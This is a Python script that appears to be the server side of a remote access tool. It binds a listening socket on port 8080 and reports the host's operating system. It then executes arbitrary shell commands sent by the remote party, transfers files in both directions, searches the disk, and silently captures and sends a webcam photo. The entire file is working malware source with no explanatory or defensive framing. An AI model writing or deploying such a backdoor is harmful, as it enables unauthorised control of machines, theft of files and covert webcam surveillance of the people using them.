from socket import *
import subprocess
import os
import cv2
import platform

HOST = ''
PORT = 8080

s = socket(AF_INET, SOCK_STREAM)
s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(1)
connection, adresse = s.accept()
ops = platform.system() + " " + platform.release()
connection.send(bytes(ops, "utf8"))

def search(befehl):
    bef = befehl.split(" ")
    path = bef[1]
    what = bef[2]
    find = 'dir ' + str(path) + ' /s /b | find "' + str(what) + '"'
    prozess = subprocess.Popen(find, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = prozess.stdout.read() + prozess.stderr.read()
    connection.send(bytes(str(output), "utf8"))

def cam():
    try:
        camera = cv2.VideoCapture(0)
        retval, im = camera.read()
        camera_capture = im
        cv2.imwrite("./cam.png", camera_capture)
        del(camera)
    except:
        connection.send(bytes("error", "utf8"))
    picsize = os.path.getsize("./cam.png")
    pic = open("./cam.png", "rb")
    picdata = pic.read()
    pic.close()
    connection.send(bytes(str(picsize), "utf8"))
    connection.send(picdata)
    os.remove("./cam.png") 
    pico = "get picture"
    connection.send(bytes(pico, "utf8"))


def put_recieve(befehl):
    bef = str(befehl).split(" ")
    pfilename = str(bef[1])
    psi = connection.recv(256)
    psize = int(str(psi, "utf8"))
    pdata = connection.recv(psize)
    pfile = open(str(pfilename), "wb")
    pfile.write(pdata)
    pfile.flush()
    pfile.close()
    po = "put " + pfilename
    connection.send(bytes(po, "utf8"))
    
    
def get_send(befehl):
    bef = str(befehl).split(" ")
    gfilename = str(bef[1])
    if os.path.isfile(gfilename):
        gsize = os.path.getsize(gfilename)
        gfile = open(gfilename, "rb")
        gdata = gfile.read()
        gfile.close()
        connection.send(bytes(str(gsize), "utf8"))
        connection.send(gdata)
        go = "get " + gfilename
        connection.send(bytes(go, "utf8"))
    else: connection.send(bytes("error", "utf8"))

def command():
    while True:
        bef = connection.recv(1024)
        befehl = str(bef, "utf8")
        if befehl == 'quit':
            connection.close()
            break
        elif "put" in befehl: put_recieve(befehl)
        elif "get" in befehl: get_send(befehl)
        elif "cam" in befehl: cam()
        elif "search" in befehl: search(befehl)
        else:
            prozess = subprocess.Popen(befehl, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = prozess.stdout.read() + prozess.stderr.read()
            connection.send(bytes(str(output), "utf8"))

command()